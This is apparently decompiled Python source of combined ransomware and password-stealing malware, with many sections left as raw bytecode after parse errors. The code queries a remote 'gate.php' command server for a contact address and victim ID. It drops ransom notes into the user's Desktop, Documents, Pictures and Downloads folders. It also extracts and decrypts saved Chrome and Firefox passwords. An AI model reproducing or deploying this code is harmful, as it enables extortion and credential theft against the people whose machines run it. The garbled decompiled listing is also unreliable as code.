    contact = urllib.request.urlopen(url + 'gate.php?opt=address')
    contact2Txt = str(contact.read())
    ReadyContact = contact2Txt.replace"b'"''
    Final = ReadyContact.replace"'"''
    return Final


def LockerID():
    lockey = urllib.request.urlopen(url + 'gate.php?opt=id&hwid=' + hwid)
    id2Txt = str(lockey.read())
    ReadyID = id2Txt.replace"b'"''
    FinalID = ReadyID.replace"'"''
    return FinalID


def CreateTxtFiles():
    dirProfile = os.environ['USERPROFILE']
    desktopTxt = open(dirProfile + '\\Desktop\\HOW_DECRYPT_FILES.txt')'w+'
    desktopTxtID = open(dirProfile + '\\Desktop\\Personal_ID.txt')'w+'
    docsTxt = open(dirProfile + '\\Documents\\HOW_DECRYPT_FILES.txt')'w+'
    picsTxt = open(dirProfile + '\\Pictures\\HOW_DECRYPT_FILES.txt')'w+'
    downsTxt = open(dirProfile + '\\Downloads\\HOW_DECRYPT_FILES.txt')'w+'
    desktopTxtID.write('Your personal ID: \n')
    desktopTxtID.write(str(LockerID()) + '\n \n')
    desktopTxtID.write("DON'T LOST IT!: \n")
    desktopTxt.write('Your files have been encrypted! \n \n')
    desktopTxt.write('For decrypt your files contact with: \n \n')
    desktopTxt.write(str(ContactLocker()) + ' \n \n')
    desktopTxt.write('Your personal ID: \n')
    desktopTxt.write(str(LockerID()) + '\n \n')
    desktopTxt.write('Here you have a videodemo for show how works the decryption tool: \n')
    desktopTxt.write('https://vimeo.com/504511680 \n')
    docsTxt.write('Your files have been encrypted! \n \n')
    docsTxt.write('For decrypt your files contact with: \n \n')
    docsTxt.write(str(ContactLocker()) + ' \n \n')
    docsTxt.write('Your personal ID: \n')
    docsTxt.write(str(LockerID()) + '\n \n')
    docsTxt.write('Here you have a videodemo for show how works the decryption tool: \n')
    docsTxt.write('https://vimeo.com/504511680 \n')
    picsTxt.write('Your files have been encrypted! \n \n')
    picsTxt.write('For decrypt your files contact with: \n \n')
    picsTxt.write(str(ContactLocker()) + ' \n \n')
    picsTxt.write('Your personal ID: \n')
    picsTxt.write(str(LockerID()) + '\n \n')
    picsTxt.write('Here you have a videodemo for show how works the decryption tool: \n')
    picsTxt.write('https://vimeo.com/504511680 \n')
    downsTxt.write('Your files have been encrypted! \n \n')
    downsTxt.write('For decrypt your files contact with: \n \n')
    downsTxt.write(str(ContactLocker()) + ' \n \n')
    downsTxt.write('Your personal ID: \n')
    downsTxt.write(str(LockerID()) + '\n \n')
    downsTxt.write('Here you have a videodemo for show how works the decryption tool: \n')
    os.remove(keyPath)


def get_master_key--- This code section failed: ---

 L. 208         0  SETUP_FINALLY       140  'to 140'

 L. 209         2  LOAD_GLOBAL              open
                4  LOAD_GLOBAL              os
                6  LOAD_ATTR                environ
                8  LOAD_STR                 'USERPROFILE'
               10  BINARY_SUBSCR    
               12  LOAD_GLOBAL              os
               14  LOAD_ATTR                sep
               16  BINARY_ADD       
               18  LOAD_STR                 'AppData\\Local\\Google\\Chrome\\User Data\\Local State'
               20  BINARY_ADD       
               22  LOAD_STR                 'r'
               24  LOAD_STR                 'utf-8'
               26  LOAD_CONST               ('encoding',)
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  SETUP_WITH           66  'to 66'
               32  STORE_FAST               'f'

 L. 210        34  LOAD_FAST                'f'
               36  LOAD_METHOD              read
               38  CALL_METHOD_0         0  ''
               40  STORE_FAST               'local_state'

 L. 211        42  LOAD_GLOBAL              json
               44  LOAD_METHOD              loads
               46  LOAD_FAST                'local_state'
               48  CALL_METHOD_1         1  ''
               50  STORE_FAST               'local_state'
               52  POP_BLOCK        
               54  LOAD_CONST               None
               56  DUP_TOP          
               58  DUP_TOP          
               60  CALL_FUNCTION_3       3  ''
               62  POP_TOP          
               64  JUMP_FORWARD         82  'to 82'
             66_0  COME_FROM_WITH       30  '30'
               66  <49>             
               68  POP_JUMP_IF_TRUE     72  'to 72'
               70  <48>             
             72_0  COME_FROM            68  '68'
               72  POP_TOP          
               74  POP_TOP          
               76  POP_TOP          
               78  POP_EXCEPT       
               80  POP_TOP          
             82_0  COME_FROM            64  '64'

 L. 212        82  LOAD_GLOBAL              base64
               84  LOAD_METHOD              b64decode
               86  LOAD_FAST                'local_state'
               88  LOAD_STR                 'os_crypt'
               90  BINARY_SUBSCR    
               92  LOAD_STR                 'encrypted_key'
               94  BINARY_SUBSCR    
               96  CALL_METHOD_1         1  ''
               98  STORE_FAST               'master_key'

 L. 213       100  LOAD_FAST                'master_key'
              102  LOAD_CONST               5
              104  LOAD_CONST               None
              106  BUILD_SLICE_2         2 
              108  BINARY_SUBSCR    
              110  STORE_FAST               'master_key'

 L. 214       112  LOAD_GLOBAL              win32crypt
              114  LOAD_METHOD              CryptUnprotectData
              116  LOAD_FAST                'master_key'
              118  LOAD_CONST               None
              120  LOAD_CONST               None
              122  LOAD_CONST               None
              124  LOAD_CONST               0
              126  CALL_METHOD_5         5  ''
              128  LOAD_CONST               1
              130  BINARY_SUBSCR    
              132  STORE_FAST               'master_key'

 L. 215       134  LOAD_FAST                'master_key'
              136  POP_BLOCK        
              138  RETURN_VALUE     
            140_0  COME_FROM_FINALLY     0  '0'

 L. 216       140  POP_TOP          
              142  POP_TOP          
              144  POP_TOP          

 L. 217       146  LOAD_STR                 'erno'
              148  STORE_FAST               'e'
              150  POP_EXCEPT       
              152  JUMP_FORWARD        156  'to 156'
              154  <48>             
            156_0  COME_FROM           152  '152'

Parse error at or near `DUP_TOP' instruction at offset 56


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password--- This code section failed: ---

 L. 229         0  SETUP_FINALLY        68  'to 68'

 L. 230         2  LOAD_FAST                'buff'
                4  LOAD_CONST               3
                6  LOAD_CONST               15
                8  BUILD_SLICE_2         2 
               10  BINARY_SUBSCR    
               12  STORE_FAST               'iv'

 L. 231        14  LOAD_FAST                'buff'
               16  LOAD_CONST               15
               18  LOAD_CONST               None
               20  BUILD_SLICE_2         2 
               22  BINARY_SUBSCR    
               24  STORE_FAST               'payload'

 L. 232        26  LOAD_GLOBAL              generate_cipher
               28  LOAD_FAST                'master_key'
               30  LOAD_FAST                'iv'
               32  CALL_FUNCTION_2       2  ''
               34  STORE_FAST               'cipher'

 L. 233        36  LOAD_GLOBAL              decrypt_payload
               38  LOAD_FAST                'cipher'
               40  LOAD_FAST                'payload'
               42  CALL_FUNCTION_2       2  ''
               44  STORE_FAST               'decrypted_pass'

 L. 234        46  LOAD_FAST                'decrypted_pass'
               48  LOAD_CONST               None
               50  LOAD_CONST               -16
               52  BUILD_SLICE_2         2 
               54  BINARY_SUBSCR    
               56  LOAD_METHOD              decode
               58  CALL_METHOD_0         0  ''
               60  STORE_FAST               'decrypted_pass'

 L. 235        62  LOAD_FAST                'decrypted_pass'
               64  POP_BLOCK        
               66  RETURN_VALUE     
             68_0  COME_FROM_FINALLY     0  '0'

 L. 236        68  DUP_TOP          
               70  LOAD_GLOBAL              Exception
               72  <121>               104  ''
               74  POP_TOP          
               76  STORE_FAST               'e'
               78  POP_TOP          
               80  SETUP_FINALLY        96  'to 96'

 L. 239        82  POP_BLOCK        
               84  POP_EXCEPT       
               86  LOAD_CONST               None
               88  STORE_FAST               'e'
               90  DELETE_FAST              'e'
               92  LOAD_STR                 'Chrome < 80'
               94  RETURN_VALUE     
             96_0  COME_FROM_FINALLY    80  '80'
               96  LOAD_CONST               None
               98  STORE_FAST               'e'
              100  DELETE_FAST              'e'
              102  <48>             
              104  <48>             

Parse error at or near `<121>' instruction at offset 72


def getShortLE(d, a):
    return unpack'<H'd[a:a + 2][0]


def getLongBE(d, a):
    return unpack'>L'd[a:a + 4][0]


asn1Types = {48:'SEQUENCE', 
 4:'OCTETSTRING',  6:'OBJECTIDENTIFIER',  2:'INTEGER',  5:'NULL'}
oidValues = {b'2a864886f70d010c050103':'1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC', 
 b'2a864886f70d0307':'1.2.840.113549.3.7 des-ede3-cbc', 
 b'2a864886f70d010101':'1.2.840.113549.1.1.1 pkcs-1', 
 b'2a864886f70d01050d':'1.2.840.113549.1.5.13 pkcs5 pbes2', 
 b'2a864886f70d01050c':'1.2.840.113549.1.5.12 pkcs5 PBKDF2', 
 b'2a864886f70d0209':'1.2.840.113549.2.9 hmacWithSHA256', 
 b'60864801650304012a':'2.16.840.1.101.3.4.1.42 aes256-CBC'}

def printASN1--- This code section failed: ---

 L. 260         0  LOAD_FAST                'd'
                2  LOAD_CONST               0
                4  BINARY_SUBSCR    
                6  STORE_FAST               'type'

 L. 261         8  LOAD_FAST                'd'
               10  LOAD_CONST               1
               12  BINARY_SUBSCR    
               14  STORE_FAST               'length'

 L. 262        16  LOAD_FAST                'length'
               18  LOAD_CONST               128
               20  BINARY_AND       
               22  LOAD_CONST               0
               24  COMPARE_OP               >
               26  POP_JUMP_IF_FALSE    50  'to 50'

 L. 263        28  LOAD_FAST                'length'
               30  LOAD_CONST               127
               32  BINARY_AND       
               34  STORE_FAST               'nByteLength'

 L. 264        36  LOAD_FAST                'd'
               38  LOAD_CONST               2
               40  BINARY_SUBSCR    
               42  STORE_FAST               'length'

 L. 266        44  LOAD_CONST               1
               46  STORE_FAST               'skip'
               48  JUMP_FORWARD         54  'to 54'
             50_0  COME_FROM            26  '26'

 L. 268        50  LOAD_CONST               0
               52  STORE_FAST               'skip'
             54_0  COME_FROM            48  '48'

 L. 270        54  LOAD_FAST                'type'
               56  LOAD_CONST               48
               58  COMPARE_OP               ==
               60  POP_JUMP_IF_FALSE   136  'to 136'

 L. 271        62  LOAD_FAST                'length'
               64  STORE_FAST               'seqLen'

 L. 272        66  LOAD_CONST               0
               68  STORE_FAST               'readLen'
             70_0  COME_FROM           126  '126'

 L. 273        70  LOAD_FAST                'seqLen'
               72  LOAD_CONST               0
               74  COMPARE_OP               >
               76  POP_JUMP_IF_FALSE   128  'to 128'

 L. 275        78  LOAD_GLOBAL              printASN1
               80  LOAD_FAST                'd'
               82  LOAD_CONST               2
               84  LOAD_FAST                'skip'
               86  BINARY_ADD       
               88  LOAD_FAST                'readLen'
               90  BINARY_ADD       
               92  LOAD_CONST               None
               94  BUILD_SLICE_2         2 
               96  BINARY_SUBSCR    
               98  LOAD_FAST                'seqLen'
              100  LOAD_FAST                'rl'
              102  LOAD_CONST               1
              104  BINARY_ADD       
              106  CALL_FUNCTION_3       3  ''
              108  STORE_FAST               'len2'

 L. 277       110  LOAD_FAST                'seqLen'
              112  LOAD_FAST                'len2'
              114  BINARY_SUBTRACT  
              116  STORE_FAST               'seqLen'

 L. 278       118  LOAD_FAST                'readLen'
              120  LOAD_FAST                'len2'
              122  BINARY_ADD       
              124  STORE_FAST               'readLen'
              126  JUMP_BACK            70  'to 70'
            128_0  COME_FROM            76  '76'

 L. 279       128  LOAD_FAST                'length'
              130  LOAD_CONST               2
              132  BINARY_ADD       
              134  RETURN_VALUE     
            136_0  COME_FROM            60  '60'

 L. 280       136  LOAD_FAST                'type'
              138  LOAD_CONST               6
              140  COMPARE_OP               ==
              142  POP_JUMP_IF_FALSE   190  'to 190'

 L. 281       144  LOAD_GLOBAL              hexlify
              146  LOAD_FAST                'd'
              148  LOAD_CONST               2
              150  LOAD_CONST               2
              152  LOAD_FAST                'length'
              154  BINARY_ADD       
              156  BUILD_SLICE_2         2 
              158  BINARY_SUBSCR    
              160  CALL_FUNCTION_1       1  ''
              162  STORE_FAST               'oidVal'

 L. 282       164  LOAD_FAST                'oidVal'
              166  LOAD_GLOBAL              oidValues
              168  <118>                 0  ''
              170  POP_JUMP_IF_FALSE   178  'to 178'

 L. 284       172  LOAD_STR                 'e'
              174  STORE_FAST               'e'
              176  JUMP_FORWARD        182  'to 182'
            178_0  COME_FROM           170  '170'

 L. 286       178  LOAD_STR                 'e'
              180  STORE_FAST               'e'
            182_0  COME_FROM           176  '176'

 L. 287       182  LOAD_FAST                'length'
              184  LOAD_CONST               2
              186  BINARY_ADD       
              188  RETURN_VALUE     
            190_0  COME_FROM           142  '142'

 L. 288       190  LOAD_FAST                'type'
              192  LOAD_CONST               4
              194  COMPARE_OP               ==
              196  POP_JUMP_IF_FALSE   206  'to 206'

 L. 289       198  LOAD_FAST                'length'
              200  LOAD_CONST               2
              202  BINARY_ADD       
              204  RETURN_VALUE     
            206_0  COME_FROM           196  '196'

 L. 290       206  LOAD_FAST                'type'
              208  LOAD_CONST               5
              210  COMPARE_OP               ==
              212  POP_JUMP_IF_FALSE   230  'to 230'

 L. 291       214  LOAD_GLOBAL              print
              216  LOAD_CONST               0
              218  CALL_FUNCTION_1       1  ''
              220  POP_TOP          

 L. 292       222  LOAD_FAST                'length'
              224  LOAD_CONST               2
              226  BINARY_ADD       
              228  RETURN_VALUE     
            230_0  COME_FROM           212  '212'

 L. 293       230  LOAD_FAST                'type'
              232  LOAD_CONST               2
              234  COMPARE_OP               ==
          236_238  POP_JUMP_IF_FALSE   272  'to 272'

 L. 294       240  LOAD_GLOBAL              print
              242  LOAD_GLOBAL              hexlify
              244  LOAD_FAST                'd'
              246  LOAD_CONST               2
              248  LOAD_CONST               2
              250  LOAD_FAST                'length'
              252  BINARY_ADD       
              254  BUILD_SLICE_2         2 
              256  BINARY_SUBSCR    
              258  CALL_FUNCTION_1       1  ''
              260  CALL_FUNCTION_1       1  ''
              262  POP_TOP          

 L. 295       264  LOAD_FAST                'length'
              266  LOAD_CONST               2
              268  BINARY_ADD       
              270  RETURN_VALUE     
            272_0  COME_FROM           236  '236'

 L. 297       272  LOAD_FAST                'length'
              274  LOAD_FAST                'l'
              276  LOAD_CONST               2
              278  BINARY_SUBTRACT  
              280  COMPARE_OP               ==
          282_284  POP_JUMP_IF_FALSE   314  'to 314'

 L. 298       286  LOAD_GLOBAL              printASN1
              288  LOAD_FAST                'd'
              290  LOAD_CONST               2
              292  LOAD_CONST               None
              294  BUILD_SLICE_2         2 
              296  BINARY_SUBSCR    
              298  LOAD_FAST                'length'
              300  LOAD_FAST                'rl'
              302  LOAD_CONST               1
              304  BINARY_ADD       
              306  CALL_FUNCTION_3       3  ''
              308  POP_TOP          

 L. 299       310  LOAD_FAST                'length'
              312  RETURN_VALUE     
            314_0  COME_FROM           282  '282'

Parse error at or near `<118>' instruction at offset 168


def readBsddb(name):
    f = openname'rb'
    header = f.read(60)
    magic = getLongBEheader0
    if magic != 398689:
        print('bad magic number')
        sys.exit()
    version = getLongBEheader4
    if version != 2:
        print('bad version, !=2 (1.85)')
        sys.exit()
    pagesize = getLongBEheader12
    nkeys = getLongBEheader56
    if options.verbose > 1:
        print('pagesize=0x%x' % pagesize)
        print('nkeys=%d' % nkeys)
    readkeys = 0
    page = 1
    nval = 0
    val = 1
    db1 = []
    while True:
        if readkeys < nkeys:
            f.seek(pagesize * page)
            offsets = f.read((nkeys + 1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
        else:
            while True:
                if nval != val:
                    keys += 1
                    key = getShortLEoffsets(2 + i)
                    val = getShortLEoffsets(4 + i)
                    nval = getShortLEoffsets(8 + i)
                    offsetVals.append(key + pagesize * page)
                    offsetVals.append(val + pagesize * page)
                    readkeys += 1
                    i += 4

            offsetVals.append(pagesize * (page + 1))
            valKey = sorted(offsetVals)
            for i in range(keys * 2):
                f.seek(valKey[i])
                data = f.read(valKey[(i + 1)] - valKey[i])
                db1.append(data)
            else:
                page += 1

    f.close()
    db = {}
    for i in range0len(db1)2:
        db[db1[(i + 1)]] = db1[i]
    else:
        if options.verbose > 1:
            for i in db:
                print('%s: %s' % (repr(i), hexlify(db[i])))

            return db


def decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedData):
    hp = sha1(globalSalt + masterPassword).digest()
    pes = entrySalt + b'\x00' * (20 - len(entrySalt))
    chp = sha1(hp + entrySalt).digest()
    k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
    tk = hmac.new(chp, pes, sha1).digest()
    k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
    k = k1 + k2
    iv = k[-8:]
    key = k[:24]
    if options.verbose > 0:
        print('key= %s, iv=%s' % (hexlify(key), hexlify(iv)))
    return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)


def decodeLoginData(data):
    """
  SEQUENCE {
    OCTETSTRING b'f8000000000000000000000000000001'
    SEQUENCE {
      OBJECTIDENTIFIER 1.2.840.113549.3.7 des-ede3-cbc
      OCTETSTRING iv 8 bytes
    }
    OCTETSTRING encrypted
  }
  """
    asn1data = decoder.decode(b64decode(data))
    key_id = asn1data[0][0].asOctets()
    iv = asn1data[0][1][1].asOctets()
    ciphertext = asn1data[0][2].asOctets()
    return (
     key_id, iv, ciphertext)


def list_files(filepath, filetype):
    paths = []
    for root, dirs, files in os.walk(filepath):
        for file in files:
            if file.lower().endswith(filetype.lower()):
                paths.append(os.path.joinrootfile)
        else:
            return paths


def search_login():
    mozilla_dir = os.environ['USERPROFILE'] + os.sep + 'AppData\\Roaming\\Mozilla\\Firefox\\Profiles'
    my_files_list = list_filesmozilla_dir'logins.json'
    return my_files_list


def swap(text):
    text = text.replace'['''
    text = text.replace']'''
    text = text.replace"'"''
    text = text.replace'logins.json'''
    return text


def profile_path():
    if search_login() == None:
        print('None')
    else:
        login_dir = str(search_login())
        login_json_path = swap(login_dir)
        return login_json_path


def getLoginData--- This code section failed: ---

 L. 427         0  BUILD_LIST_0          0 
                2  STORE_FAST               'logins'

 L. 428         4  LOAD_GLOBAL              Path
                6  LOAD_GLOBAL              profile_path
                8  CALL_FUNCTION_0       0  ''
               10  CALL_FUNCTION_1       1  ''
               12  STORE_FAST               'profile_directory'

 L. 430        14  LOAD_FAST                'profile_directory'
               16  LOAD_STR                 'signons.sqlite'
               18  BINARY_TRUE_DIVIDE
               20  STORE_FAST               'sqlite_file'

 L. 431        22  LOAD_FAST                'profile_directory'
               24  LOAD_STR                 'logins.json'
               26  BINARY_TRUE_DIVIDE
               28  STORE_FAST               'json_file'

 L. 432        30  LOAD_FAST                'json_file'
               32  LOAD_METHOD              exists
               34  CALL_METHOD_0         0  ''
               36  POP_JUMP_IF_FALSE   144  'to 144'

 L. 433        38  LOAD_GLOBAL              open
               40  LOAD_FAST                'json_file'
               42  LOAD_STR                 'r'
               44  CALL_FUNCTION_2       2  ''
               46  LOAD_METHOD              read
               48  CALL_METHOD_0         0  ''
               50  STORE_FAST               'loginf'

 L. 434        52  LOAD_GLOBAL              json
               54  LOAD_METHOD              loads
               56  LOAD_FAST                'loginf'
               58  CALL_METHOD_1         1  ''
               60  STORE_FAST               'jsonLogins'

 L. 435        62  LOAD_STR                 'logins'
               64  LOAD_FAST                'jsonLogins'
               66  <118>                 1  ''
               68  POP_JUMP_IF_FALSE    82  'to 82'

 L. 436        70  LOAD_GLOBAL              print
               72  LOAD_STR                 "error: no 'logins' key in logins.json"
               74  CALL_FUNCTION_1       1  ''
               76  POP_TOP          

 L. 437        78  BUILD_LIST_0          0 
               80  RETURN_VALUE     
             82_0  COME_FROM            68  '68'

 L. 438        82  LOAD_FAST                'jsonLogins'
               84  LOAD_STR                 'logins'
               86  BINARY_SUBSCR    
               88  GET_ITER         
             90_0  COME_FROM           138  '138'
               90  FOR_ITER            140  'to 140'
               92  STORE_FAST               'row'

 L. 439        94  LOAD_FAST                'row'
               96  LOAD_STR                 'encryptedUsername'
               98  BINARY_SUBSCR    
              100  STORE_FAST               'encUsername'

 L. 440       102  LOAD_FAST                'row'
              104  LOAD_STR                 'encryptedPassword'
              106  BINARY_SUBSCR    
              108  STORE_FAST               'encPassword'

 L. 441       110  LOAD_FAST                'logins'
              112  LOAD_METHOD              append
              114  LOAD_GLOBAL              decodeLoginData
              116  LOAD_FAST                'encUsername'
              118  CALL_FUNCTION_1       1  ''
              120  LOAD_GLOBAL              decodeLoginData
              122  LOAD_FAST                'encPassword'
              124  CALL_FUNCTION_1       1  ''
              126  LOAD_FAST                'row'
              128  LOAD_STR                 'hostname'
              130  BINARY_SUBSCR    
              132  BUILD_TUPLE_3         3 
              134  CALL_METHOD_1         1  ''
              136  POP_TOP          
              138  JUMP_BACK            90  'to 90'
            140_0  COME_FROM            90  '90'

 L. 442       140  LOAD_FAST                'logins'
              142  RETURN_VALUE     
            144_0  COME_FROM            36  '36'

 L. 443       144  LOAD_FAST                'sqlite_file'
              146  LOAD_METHOD              exists
              148  CALL_METHOD_0         0  ''
          150_152  POP_JUMP_IF_FALSE   274  'to 274'

 L. 444       154  LOAD_GLOBAL              print
              156  LOAD_STR                 'sqlite'
              158  CALL_FUNCTION_1       1  ''
              160  POP_TOP          

 L. 445       162  LOAD_GLOBAL              sqlite3
              164  LOAD_METHOD              connect
              166  LOAD_FAST                'sqlite_file'
              168  CALL_METHOD_1         1  ''
              170  STORE_FAST               'conn'

 L. 446       172  LOAD_FAST                'conn'
              174  LOAD_METHOD              cursor
              176  CALL_METHOD_0         0  ''
              178  STORE_FAST               'c'

 L. 447       180  LOAD_FAST                'c'
              182  LOAD_METHOD              execute
              184  LOAD_STR                 'SELECT * FROM moz_logins;'
              186  CALL_METHOD_1         1  ''
              188  POP_TOP          

 L. 448       190  LOAD_FAST                'c'
              192  GET_ITER         
            194_0  COME_FROM           268  '268'
              194  FOR_ITER            270  'to 270'
              196  STORE_FAST               'row'

 L. 449       198  LOAD_FAST                'row'
              200  LOAD_CONST               6
              202  BINARY_SUBSCR    
              204  STORE_FAST               'encUsername'

 L. 450       206  LOAD_FAST                'row'
              208  LOAD_CONST               7
              210  BINARY_SUBSCR    
              212  STORE_FAST               'encPassword'

 L. 451       214  LOAD_GLOBAL              options
              216  LOAD_ATTR                verbose
              218  LOAD_CONST               1
              220  COMPARE_OP               >
              222  POP_JUMP_IF_FALSE   240  'to 240'

 L. 452       224  LOAD_GLOBAL              print
              226  LOAD_FAST                'row'
              228  LOAD_CONST               1
              230  BINARY_SUBSCR    
              232  LOAD_FAST                'encUsername'
              234  LOAD_FAST                'encPassword'
              236  CALL_FUNCTION_3       3  ''
              238  POP_TOP          
            240_0  COME_FROM           222  '222'

 L. 453       240  LOAD_FAST                'logins'
              242  LOAD_METHOD              append
              244  LOAD_GLOBAL              decodeLoginData
              246  LOAD_FAST                'encUsername'
              248  CALL_FUNCTION_1       1  ''
              250  LOAD_GLOBAL              decodeLoginData
              252  LOAD_FAST                'encPassword'
              254  CALL_FUNCTION_1       1  ''
              256  LOAD_FAST                'row'
              258  LOAD_CONST               1
              260  BINARY_SUBSCR    
              262  BUILD_TUPLE_3         3 
              264  CALL_METHOD_1         1  ''
              266  POP_TOP          
              268  JUMP_BACK           194  'to 194'
            270_0  COME_FROM           194  '194'

 L. 454       270  LOAD_FAST                'logins'
              272  RETURN_VALUE     
            274_0  COME_FROM           150  '150'

 L. 456       274  LOAD_STR                 'a'
              276  STORE_FAST               'e'

 L. 457       278  LOAD_CONST               None
              280  RETURN_VALUE     

Parse error at or near `<118>' instruction at offset 66


CKA_ID = unhexlify('f8000000000000000000000000000001')

def extractSecretKey--- This code section failed: ---

 L. 463         0  LOAD_FAST                'keyData'
                2  LOAD_CONST               b'password-check'
                4  BINARY_SUBSCR    
                6  STORE_FAST               'pwdCheck'

 L. 464         8  LOAD_FAST                'pwdCheck'
               10  LOAD_CONST               1
               12  BINARY_SUBSCR    
               14  STORE_FAST               'entrySaltLen'

 L. 465        16  LOAD_FAST                'pwdCheck'
               18  LOAD_CONST               3
               20  LOAD_CONST               3
               22  LOAD_FAST                'entrySaltLen'
               24  BINARY_ADD       
               26  BUILD_SLICE_2         2 
               28  BINARY_SUBSCR    
               30  STORE_FAST               'entrySalt'

 L. 466        32  LOAD_FAST                'pwdCheck'
               34  LOAD_CONST               -16
               36  LOAD_CONST               None
               38  BUILD_SLICE_2         2 
               40  BINARY_SUBSCR    
               42  STORE_FAST               'encryptedPasswd'

 L. 467        44  LOAD_FAST                'keyData'
               46  LOAD_CONST               b'global-salt'
               48  BINARY_SUBSCR    
               50  STORE_FAST               'globalSalt'

 L. 468        52  LOAD_GLOBAL              options
               54  LOAD_ATTR                verbose
               56  LOAD_CONST               1
               58  COMPARE_OP               >
               60  POP_JUMP_IF_FALSE   110  'to 110'

 L. 469        62  LOAD_GLOBAL              print
               64  LOAD_STR                 'password-check=%s'
               66  LOAD_GLOBAL              hexlify
               68  LOAD_FAST                'pwdCheck'
               70  CALL_FUNCTION_1       1  ''
               72  BINARY_MODULO    
               74  CALL_FUNCTION_1       1  ''
               76  POP_TOP          

 L. 470        78  LOAD_GLOBAL              print
               80  LOAD_STR                 'entrySalt=%s'
               82  LOAD_GLOBAL              hexlify
               84  LOAD_FAST                'entrySalt'
               86  CALL_FUNCTION_1       1  ''
               88  BINARY_MODULO    
               90  CALL_FUNCTION_1       1  ''
               92  POP_TOP          

 L. 471        94  LOAD_GLOBAL              print
               96  LOAD_STR                 'globalSalt=%s'
               98  LOAD_GLOBAL              hexlify
              100  LOAD_FAST                'globalSalt'
              102  CALL_FUNCTION_1       1  ''
              104  BINARY_MODULO    
              106  CALL_FUNCTION_1       1  ''
              108  POP_TOP          
            110_0  COME_FROM            60  '60'

 L. 472       110  LOAD_GLOBAL              decryptMoz3DES
              112  LOAD_FAST                'globalSalt'
              114  LOAD_FAST                'masterPassword'
              116  LOAD_FAST                'entrySalt'
              118  LOAD_FAST                'encryptedPasswd'
              120  CALL_FUNCTION_4       4  ''
              122  STORE_FAST               'cleartextData'

 L. 473       124  LOAD_FAST                'cleartextData'
              126  LOAD_CONST               b'password-check\x02\x02'
              128  COMPARE_OP               !=
              130  POP_JUMP_IF_FALSE   148  'to 148'

 L. 474       132  LOAD_GLOBAL              print
              134  LOAD_STR                 'password check error, Master Password is certainly used, please provide it with -p option'
              136  CALL_FUNCTION_1       1  ''
              138  POP_TOP          

 L. 475       140  LOAD_GLOBAL              sys
              142  LOAD_METHOD              exit
              144  CALL_METHOD_0         0  ''
              146  POP_TOP          
            148_0  COME_FROM           130  '130'

 L. 477       148  LOAD_GLOBAL              CKA_ID
              150  LOAD_FAST                'keyData'
              152  <118>                 1  ''
              154  POP_JUMP_IF_FALSE   160  'to 160'

 L. 478       156  LOAD_CONST               None
              158  RETURN_VALUE     
            160_0  COME_FROM           154  '154'

 L. 479       160  LOAD_FAST                'keyData'
              162  LOAD_GLOBAL              CKA_ID
              164  BINARY_SUBSCR    
              166  STORE_FAST               'privKeyEntry'

 L. 480       168  LOAD_FAST                'privKeyEntry'
              170  LOAD_CONST               1
              172  BINARY_SUBSCR    
              174  STORE_FAST               'saltLen'

 L. 481       176  LOAD_FAST                'privKeyEntry'
              178  LOAD_CONST               2
              180  BINARY_SUBSCR    
              182  STORE_FAST               'nameLen'

 L. 483       184  LOAD_GLOBAL              decoder
              186  LOAD_METHOD              decode
              188  LOAD_FAST                'privKeyEntry'
              190  LOAD_CONST               3
              192  LOAD_FAST                'saltLen'
              194  BINARY_ADD       
              196  LOAD_FAST                'nameLen'
              198  BINARY_ADD       
              200  LOAD_CONST               None
              202  BUILD_SLICE_2         2 
              204  BINARY_SUBSCR    
              206  CALL_METHOD_1         1  ''
              208  STORE_FAST               'privKeyEntryASN1'

 L. 484       210  LOAD_FAST                'privKeyEntry'
              212  LOAD_CONST               3
              214  LOAD_FAST                'saltLen'
              216  BINARY_ADD       
              218  LOAD_FAST                'nameLen'
              220  BINARY_ADD       
              222  LOAD_CONST               None
              224  BUILD_SLICE_2         2 
              226  BINARY_SUBSCR    
              228  STORE_FAST               'data'

 L. 485       230  LOAD_GLOBAL              printASN1
              232  LOAD_FAST                'data'
              234  LOAD_GLOBAL              len
              236  LOAD_FAST                'data'
              238  CALL_FUNCTION_1       1  ''
              240  LOAD_CONST               0
              242  CALL_FUNCTION_3       3  ''
              244  POP_TOP          

 L. 499       246  LOAD_FAST                'privKeyEntryASN1'
              248  LOAD_CONST               0
              250  BINARY_SUBSCR    
              252  LOAD_CONST               0
              254  BINARY_SUBSCR    
              256  LOAD_CONST               1
              258  BINARY_SUBSCR    
              260  LOAD_CONST               0
              262  BINARY_SUBSCR    
              264  LOAD_METHOD              asOctets
              266  CALL_METHOD_0         0  ''
              268  STORE_FAST               'entrySalt'

 L. 500       270  LOAD_FAST                'privKeyEntryASN1'
              272  LOAD_CONST               0
              274  BINARY_SUBSCR    
              276  LOAD_CONST               1
              278  BINARY_SUBSCR    
              280  LOAD_METHOD              asOctets
              282  CALL_METHOD_0         0  ''
              284  STORE_FAST               'privKeyData'

 L. 501       286  LOAD_GLOBAL              decryptMoz3DES
              288  LOAD_FAST                'globalSalt'
              290  LOAD_FAST                'masterPassword'
              292  LOAD_FAST                'entrySalt'
              294  LOAD_FAST                'privKeyData'
              296  CALL_FUNCTION_4       4  ''
              298  STORE_FAST               'privKey'

 L. 502       300  LOAD_GLOBAL              print
              302  LOAD_STR                 'decrypting privKeyData'
              304  CALL_FUNCTION_1       1  ''
              306  POP_TOP          

 L. 503       308  LOAD_GLOBAL              options
              310  LOAD_ATTR                verbose
              312  LOAD_CONST               0
              314  COMPARE_OP               >
          316_318  POP_JUMP_IF_FALSE   368  'to 368'

 L. 504       320  LOAD_GLOBAL              print
              322  LOAD_STR                 'entrySalt=%s'
              324  LOAD_GLOBAL              hexlify
              326  LOAD_FAST                'entrySalt'
              328  CALL_FUNCTION_1       1  ''
              330  BINARY_MODULO    
              332  CALL_FUNCTION_1       1  ''
              334  POP_TOP          

 L. 505       336  LOAD_GLOBAL              print
              338  LOAD_STR                 'privKeyData=%s'
              340  LOAD_GLOBAL              hexlify
              342  LOAD_FAST                'privKeyData'
              344  CALL_FUNCTION_1       1  ''
              346  BINARY_MODULO    
              348  CALL_FUNCTION_1       1  ''
